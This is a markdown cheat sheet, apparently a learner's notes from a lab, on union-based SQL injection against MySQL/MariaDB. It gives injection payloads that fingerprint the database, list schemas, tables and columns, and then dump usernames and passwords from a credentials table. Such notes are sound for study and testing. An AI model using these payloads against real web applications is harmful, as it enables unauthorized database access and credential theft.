@@ -1,0 +1,116 @@
+💥 SQLi Database Enumeration Breakdown (Union-Based)
+🧠 1. Fingerprint the DBMS
+✅ Try: @@version, POW(1,1), or SLEEP(5)
+
+If @@version gives something like 10.3.22-MariaDB, now you know: MySQL/MariaDB, proceed with MySQL syntax.
+
+📚 2. Find Database Names
+✅ Query:
+
+sql
+Copy
+Edit
+SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA
+💉 Injection format:
+
+sql
+Copy
+Edit
+' UNION SELECT 1, schema_name, 3, 4 FROM INFORMATION_SCHEMA.SCHEMATA-- -
+❗ Ignore defaults like: information_schema, mysql, performance_schema
+
+🎯 3. Identify the Active (Current) DB
+✅ Query:
+
+sql
+Copy
+Edit
+SELECT database()
+💉 Injection format:
+
+sql
+Copy
+Edit
+' UNION SELECT 1, database(), 3, 4-- -
+📦 4. Find Tables in a Target DB
+✅ Query:
+
+sql
+Copy
+Edit
+SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='target_db'
+💉 Injection format:
+
+sql
+Copy
+Edit
+' UNION SELECT 1, TABLE_NAME, TABLE_SCHEMA, 4 FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='dev'-- -
+🧱 5. Find Columns in a Target Table
+✅ Query:
+
+sql
+Copy
+Edit
+SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='target_table'
+💉 Injection format:
+
+sql
+Copy
+Edit
+' UNION SELECT 1, COLUMN_NAME, TABLE_NAME, TABLE_SCHEMA FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='credentials'-- -
+🥷 6. Dump the Actual Data
+✅ Query:
+
+sql
+Copy
+Edit
+SELECT username, password FROM dev.credentials
+💉 Injection format:
+
+sql
+Copy
+Edit
+' UNION SELECT 1, username, password, 4 FROM dev.credentials-- -
+🔁 Summary Workflow (Mental Model)
+rust
+Copy
+Edit
+Test -> Confirm SQLi ->
+Fingerprint DBMS ->
+List DBs ->
+Target DB -> List Tables ->
+Target Table -> List Columns ->
+SELECT column1, column2 FROM target_table
+
+
+  🧠 The Union-Based Sections (What They Really Teach You):
+✅ Section 1 — Where can I inject?
+You’re probing for how many columns exist, and which ones reflect to the page.
+
+This lets you place your payload in the right spot to see the output.
+
+✅ Section 2 — Now that I know where to inject, what can I do?
+You use SQL queries to enumerate the environment, just like you would in mysql -u root -p — except now you're doing it through a vulnerable web app.
+
+You’re basically doing:
+
+SHOW DATABASES; → via SELECT schema_name FROM information_schema.schemata
+
+USE dev; SHOW TABLES; → via SELECT table_name FROM information_schema.tables WHERE table_schema='dev'
+
+DESCRIBE credentials; → via SELECT column_name FROM information_schema.columns WHERE table_name='credentials'
+
+SELECT * FROM dev.credentials; → via a crafted UNION SELECT to dump the juicy data.
+
+💡 Why This Matters
+This is how real-world SQLi works when:
+
+You don’t have CLI access
+
+You’re limited to what prints on the webpage
+
+You have to get creative, blend recon with exploitation, and make your payloads fit the response format
+
+
+
+  
